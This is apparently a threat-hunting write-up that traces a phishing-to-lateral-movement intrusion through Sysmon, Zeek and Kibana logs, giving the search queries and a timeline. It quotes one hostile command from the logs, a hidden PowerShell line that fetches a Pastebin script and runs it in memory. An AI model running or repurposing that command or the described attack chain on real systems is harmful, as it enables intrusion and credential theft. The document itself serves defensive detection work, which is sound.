# I spent an afternoon chasing "Stuxbot" through our logs. Here's how it went.

We got a TI report a while back on a group called Stuxbot. Nothing fancy about their approach — opportunistic, not picky about targets, motivated by espionage. But they had a repeatable playbook: phishing email, OneNote attachment, batch file, PowerShell running in memory, then a RAT that sticks around for persistence. The report gave us enough to go hunting for it in our own environment, so I opened Kibana and started poking around the Sysmon and Zeek indices.

My starting theory was pretty basic: somebody in the org got a phishing email with a malicious OneNote file, opened it, and set off the chain described in the report. That's worth saying out loud because it actually matters — if I'd started from "did this specific hash execute anywhere," I'd have written a completely different first query. Where you start shapes everything downstream.

## First query, first hit

The TI report named the lure file — `invoice.one`. Since it came in by email, I figured the fastest way to find it was checking browser download activity. Sysmon logs this under event code 15.

```
event.code:15 AND file.name:*invoice.one
```

Three results, all stamped 22:05:47 on March 26. Downloaded through Edge, landed in the Downloads folder, on a machine called WS001, belonging to a user named Bob.

Okay, so the file's on disk. That doesn't mean much by itself though — plenty of files sit in Downloads folders forever without anyone touching them. I cross-referenced it against event code 11 (file creation) and found the `Zone.Identifier` stream Windows tacks onto anything downloaded from the internet. Two sources agreeing the file came from outside. Good enough to keep going.

## Where the logs just... stopped

I wanted the actual network connection behind that download, so I went looking in Sysmon's network connection logs (event code 3). Nothing. Empty.

My first instinct was annoyance, honestly — like the trail had gone cold five minutes in. But this is actually pretty normal. A lot of Sysmon configs exclude browser network connections on purpose because otherwise you drown in logging volume from every page load. So instead of treating it as a wall, I took it as a sign to check somewhere else — Zeek, which watches traffic regardless of what any given host feels like logging.

Filtered Zeek's DNS logs down to WS001's IP around the download window, cut out the obvious noise (Google, etc.), and there it was: a query to file.io right after a Gmail visit, then Microsoft's SmartScreen doing its usual download check right after that. Resolved file.io's answers to two IPs, checked connection logs against them, and confirmed WS001 actually connected to one of them on port 443. So now I had the download confirmed two completely different ways, neither of which depended on the browser log I started with.

Bob downloaded invoice.one from Gmail via file.io at 22:05:47. That much I was now sure of.

## Somebody opened it almost immediately

A file sitting in a folder isn't a compromise. Somebody has to open it. I checked for any process referencing the filename directly and got one hit — ONENOTE.EXE, launched with invoice.one as an argument, six seconds after the download finished. Bob clicked it almost the second it landed.

From there I wanted to know what OneNote itself kicked off, since these lure files usually have a fake button embedded that triggers something else. Filtered for anything with OneNote as the parent process and got two relevant results. One was OneNoteM.exe — totally normal, that's the legit helper OneNote uses to open embedded attachments. The other was cmd.exe running a file called invoice.bat, launched out of a temp path OneNote uses when it exports embedded content.

So the chain so far: OneNote opens the file, the fake-button trick fires, and a batch script runs. Classic.

## The part where it gets ugly

Checked what spawned off invoice.bat and got this:

```
powershell.exe -nop -w hidden -noni -noexit -iex (iwr https://pastebin.com/raw/33Z1jP6J -usebasicparsing)
```

Hidden window, nothing written to disk, pulling a script straight off Pastebin and running it in memory. This is the stage where a lot of antivirus products just aren't looking — there's no file to scan.

I grabbed the PID off that PowerShell process and pulled everything associated with it. Seventeen events came back. Among them: a file called default.exe dropped into the user's temp folder (matches the RAT description from the TI report), DNS lookups and connections to an ngrok subdomain over 443, and a copy of DomainPasswordSpray.ps1 staged in the public users folder. Ngrok's the interesting one — it's a real, legitimate tunneling service, which is exactly why an attacker would use it for C2. It just looks like normal developer traffic on the wire.

## default.exe wasn't just sitting there

I searched for default.exe by name across the environment and got 68 hits. It had been busy — beaconing out over its own ngrok connections, and dropping two more tools: SharpHound, which maps out Active Directory attack paths, and a file named svchost.exe sitting in a temp directory it has no business being in. Somebody picked that name on purpose, hoping it'd blend into a process list full of legitimate svchost instances.

SharpHound had actually run — twice, about two minutes apart, with the flag set to collect everything. Users, groups, sessions, ACLs, trust relationships. At this point whoever was behind this had a full map of our domain.

## It wasn't just WS001 anymore

Sysmon had the SHA256 on default.exe, and it matched the TI report's hash exactly. That's usually the point to stop looking at one machine and check everywhere.

```
process.hash.sha256:018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4
```

Twelve hits. Two hosts. WS001, obviously, but also a server called PKI — and on PKI it had run under a service account, svc-sql1. That's a second host and a domain-level account both in play now. Checking the parent process on PKI showed PSEXESVC.exe, meaning they'd used PsExec to get there — a completely legitimate admin tool that just happens to be a favorite for lateral movement too.

Last question: how'd they get svc-sql1's credentials? I remembered the password spray script from earlier and went back to the authentication logs on WS001, filtering for network logons. Found two failed attempts against the administrator account right around when everything else was happening, and then, two days later, a string of successful logons as svc-sql1. Didn't get the account they tried first, but got one that worked.

## What actually happened here

Start to finish, this was about fifteen minutes of actual attacker activity, spread across eleven pivots and two different log sources on my end to piece it together. A few things stuck with me afterward.

No single log source told the whole story on its own — the browser log said a file existed, Zeek filled in the network gap Sysmon left, process logs showed execution, and the auth logs closed the loop on how credentials got stolen. I needed all four.

Also, the missing network log wasn't a dead end, it was information. Once I understood _why_ it was empty, I knew exactly where else to look. That's a distinction that's easy to miss when you're used to treating gaps as failures instead of clues.

And every single thing I confirmed turned into the next question instead of an answer I could close out. A hash isn't a finding you file away — it's something you run against the whole fleet. A dropped tool isn't the end of the trail, it's a reason to ask what it did next. Hashes and filenames are the easiest things for an attacker to change, so the further this went, the more I leaned on behavior instead — OneNote spawning cmd.exe, hidden PowerShell, PsExec moving between hosts. That stuff is a lot harder for them to just rename their way out of.

By the time I wrote this up, I had the whole chain documented — delivery, execution, C2, recon, credential theft, lateral movement — with a timeline and IOCs ready to hand to IR. Started from one weird file in a Downloads folder.